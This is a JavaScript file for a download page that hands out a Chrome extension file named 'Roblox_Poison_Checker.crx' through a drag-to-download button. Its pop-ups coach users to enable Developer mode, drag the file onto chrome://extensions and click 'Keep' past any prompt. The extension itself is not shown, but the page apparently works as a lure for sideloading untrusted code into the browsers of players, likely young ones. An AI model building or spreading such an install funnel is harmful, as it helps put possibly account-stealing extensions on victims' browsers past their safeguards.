// script.js - Real Drag & Download Solution

function initializeRealDrag() {
    const dragButton = document.getElementById('dragButton');
    
    if (!dragButton) return;
    
    // Make it visually draggable but actually just downloads on drag start
    dragButton.addEventListener('dragstart', function(e) {
        // Visual feedback
        dragButton.textContent = "📥 Downloading...";
        dragButton.style.background = 'linear-gradient(45deg, #4CAF50, #45a049)';
        
        // Start download immediately when drag starts
        downloadCRXFile();
        
        // Set some drag data (even though it won't actually be draggable to extensions)
        e.dataTransfer.setData('text/plain', 'Downloading Roblox Poison Checker...');
        e.dataTransfer.effectAllowed = 'copy';
    });
    
    dragButton.addEventListener('dragend', function() {
        dragButton.textContent = "🎯 Drag me to download";
        dragButton.style.background = 'linear-gradient(45deg, #FF6B6B, #FF8E53)';
    });
    
    // Prevent clicking
    dragButton.addEventListener('click', function(e) {
        e.preventDefault();
        showDragInstructions();
        return false;
    });
}

function downloadCRXFile() {
    try {
        const link = document.createElement('a');
        link.href = 'Roblox_Poison_Checker.crx';
        link.download = 'Roblox_Poison_Checker.crx';
        link.style.display = 'none';
        
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        // Show instructions after download starts
        setTimeout(showInstallInstructions, 800);
        
    } catch (error) {
        console.error('Download failed:', error);
        showError();
    }
}

function showDragInstructions() {
    const modal = `
        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 10000;">
            <div style="background: #00264d; padding: 30px; border-radius: 10px; max-width: 400px; text-align: center; border: 2px solid #FF6B6B;">
                <h3 style="color: #FF6B6B; margin-bottom: 15px;">🖱️ How to Install</h3>
                <p><strong>Don't click - DRAG the button!</strong></p>
                <p style="color: #ccc; margin: 15px 0;">Click and drag the button anywhere to start the download.</p>
                <button onclick="this.parentElement.parentElement.remove()" style="background: #FF6B6B; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
                    Got it
                </button>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', modal);
}

function showInstallInstructions() {
    const modal = `
        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 10000;">
            <div style="background: #00264d; padding: 30px; border-radius: 10px; max-width: 500px; text-align: center; border: 2px solid #4CAF50;">
                <h3 style="color: #4CAF50; margin-bottom: 20px;">✅ File Downloaded!</h3>
                
                <div style="text-align: left; background: #001f3f; padding: 20px; border-radius: 8px; margin: 20px 0;">
                    <h4>📋 Complete Installation:</h4>
                    <ol style="margin: 15px 0; padding-left: 20px;">
                        <li style="margin: 10px 0;">Open a <strong>new tab</strong></li>
                        <li style="margin: 10px 0;">Go to: <code style="background: #000; padding: 2px 6px; border-radius: 3px;">chrome://extensions</code></li>
                        <li style="margin: 10px 0;">Enable <strong>Developer mode</strong> (top-right toggle) 🔧</li>
                        <li style="margin: 10px 0;"><strong>Drag the downloaded file</strong> from your downloads folder onto the extensions page</li>
                        <li style="margin: 10px 0;">Click <strong style="color: #4CAF50;">"Keep"</strong> if prompted</li>
                    </ol>
                </div>
                
                <div style="display: flex; gap: 10px; justify-content: center;">
                    <button onclick="window.open('chrome://extensions', '_blank')" style="background: #4CAF50; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer;">
                        📂 Open Extensions
                    </button>
                    <button onclick="this.parentElement.parentElement.parentElement.remove()" style="background: #666; color: white; border: none; padding: 12px 24px; border-radius: 5px; cursor: pointer;">
                        Close
                    </button>
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', modal);
}

function showError() {
    const modal = `
        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: flex; align-items: center; justify-content: center; z-index: 10000;">
            <div style="background: #00264d; padding: 30px; border-radius: 10px; max-width: 400px; text-align: center; border: 2px solid #FF6B6B;">
                <h3 style="color: #FF6B6B; margin-bottom: 15px;">❌ Download Failed</h3>
                <p style="margin: 15px 0; color: #ccc;">The CRX file couldn't be downloaded automatically.</p>
                <div style="display: flex; gap: 10px; justify-content: center;">
                    <button onclick="window.location.href = 'Roblox_Poison_Checker.crx'" style="background: #FF6B6B; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
                        Manual Download
                    </button>
                    <button onclick="this.parentElement.parentElement.remove()" style="background: #666; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
                        Cancel
                    </button>
                </div>
            </div>
        </div>
    `;
    document.body.insertAdjacentHTML('beforeend', modal);
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    initializeRealDrag();
    console.log('🔧 Drag-to-download initialized');
});
